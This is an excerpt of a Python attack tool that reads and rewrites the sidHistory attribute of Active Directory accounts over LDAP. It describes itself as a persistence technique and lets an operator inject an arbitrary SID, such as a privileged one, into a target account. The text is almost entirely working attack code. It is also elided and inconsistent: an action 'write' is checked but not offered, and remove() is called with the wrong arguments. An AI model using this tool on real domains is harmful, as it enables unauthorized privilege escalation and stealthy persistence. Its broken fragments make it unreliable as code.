...
#
# Description:
#   Python script for handling the SID History property of a target account
#
# Author:
#   Volker Carstein (@volker_carstein)
#   based on the work of Remi Gascou (@podalirius_) and Charlie Bromberg (@_nwodtuhs) for rbcd.py
...
class SIDHistory(object):

    def __init__(self, ldap_server, ldap_session, SID_history_target):
        super(SIDHistory, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.SID_history_target = SID_history_target
        self.SID_source = None
        self.SID_from_source = None
    ...
    def read(self):
        ...
        result = self.get_user_info(self.SID_history_target)
        if not result:
            logging.error('Target account does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
    ...
    def add(self, SID_source, SID_to_inject):
        if SID_source is not None:
            self.SID_source = SID_source
            # Get user sid
            logging.info(self.SID_source)
            result = self.get_user_info(self.SID_source)
            if not result:
                logging.error('Source account to get SID from does not exist! (forgot "$" for a computer account? wrong domain?)')
                return
            self.SID_from_source = str(result[1])
        else:
            self.SID_from_source = SID_to_inject
        ...
        logging.info(self.target_DN)
        self.ldap_session.modify(self.target_DN, {'sidHistory': [ldap3.MODIFY_ADD, [self.SID_from_source]]})
        pprint(self.ldap_session.result)
        if self.ldap_session.result['result'] == 0:
            logging.info('SIDHistory modified successfully!')
    ...
    def remove(self, SID_source):
        ...
        #    sd['Dacl'].aces.append(create_allow_ace(self.SID_delegate_from))
        logging.info(self.target_DN)
        self.ldap_session.modify(self.target_DN, {'sidHistory': [ldap3.MODIFY_DELETE, [self.SID_from_source]]})
        pprint(self.ldap_session.result)
        if self.ldap_session.result['result'] == 0:
            logging.info('SIDHistory modified successfully!')
            # logging.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
    ...
    def flush(self):
        ...
        logging.info(self.target_DN)
        self.ldap_session.modify(self.target_DN, {'sidHistory': [ldap3.MODIFY_REPLACE, []]})
        pprint(self.ldap_session.result)
        if self.ldap_session.result['result'] == 0:
            logging.info('SIDHistory flushed successfully!')
            # logging.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
    ...
    def get_user_info(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid', 'sidHistory'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            if not self.ldap_session.entries[0]['sidHistory']:
                sid_history = []
                print(self.ldap_session.entries[0]['sidHistory'].raw_values)
            else:
                print(self.ldap_session.entries[0]['sidHistory'].raw_values)
                sid_history = [format_sid(raw_value) for raw_value in self.ldap_session.entries[0]['sidHistory'].raw_values]
            return dn, sid, sid_history
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname', 'sidHistory'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            ...
            if not self.ldap_session.entries[0]['sidHistory']:
                ...
                sid_history = format_sid(self.ldap_session.entries[0]['sidHistory'].raw_values[0])
            return dn, samname, sid_history
        except IndexError:
...
def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Python (re)setter for attribute SIDHistory when used as a persistence technique.')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument("-sid-history-target", type=str, required=True,
                        help="Target account the SIDHistory is to be read/edited/etc.")
    parser.add_argument("-sid-source", type=str, required=False, default=None,
                        help="Account of which the SID will be written in the SIDHistory of -sid-history-target (only when using `-action write` and `-action remove`)")
    parser.add_argument("-sid-to-inject", type=str, required=False, default=None,
                        help="SID to add or remove in the SIDHistory of -sid-history-target (only when using `-action write` and `-action remove`)")
    parser.add_argument('-action', choices=['read', 'add', 'remove', 'flush'], nargs='?', default='read',
                        help='Action to operate on SIDHistory')
...
def main():
    ...
    if args.action == 'write' and args.sid_source is None and args.sid_to_inject is None:
        logging.critical('`-sid-source` or `-sid-to-inject` should be specified when using `-action write` !')
        sys.exit(1)

    if args.action == 'remove' and args.sid_source is None and args.sid_to_inject is None:
        logging.critical('`-sid-source` or `-sid-to-inject` should be specified when using `-action remove` !')
        sys.exit(1)
    ...
    try:
        ...
        sid_history = SIDHistory(ldap_server, ldap_session, args.sid_history_target)
        if args.action == 'read':
            sid_history.read()
        elif args.action == 'add':
            sid_history.add(args.sid_source, args.sid_to_inject)
        elif args.action == 'remove':
            sid_history.remove(args.sid_source, args.sid_to_inject)
